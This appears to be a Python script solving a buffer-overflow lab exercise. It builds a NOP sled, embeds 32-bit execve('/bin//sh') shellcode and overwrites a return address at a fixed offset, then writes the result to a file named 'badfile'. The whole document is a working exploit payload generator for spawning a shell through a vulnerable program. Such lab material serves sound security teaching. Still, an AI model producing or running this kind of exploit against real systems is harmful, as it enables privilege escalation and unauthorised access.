#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(500))


########################################################################
# Put the shellcode somewhere in the payload
start = 500 - len(shellcode)			# Change this number
content[start: start+ len(shellcode)] = shellcode


# Decide the return address value
# and put it somewhere in the payload

# The first number is the value of ebp found from debugger
# The second one is to compensate for the space
# taken up during debugging
ret = 0xffffcb18 + 0x100 		# Change this number

# offset generated by taking the difference between $ebp and &buffer
# and adding 4 (for 32 bit) to it
offset = 22

L = 4		# Use 4 for 32-bit address and 8 for 64-bit address

content[offset : offset+L] = (ret).to_bytes(L, byteorder="little")
##########################################################################

# Write the content to a file
with open("badfile", "wb") as file:
	file.write(content)

print("Written content to badfile")


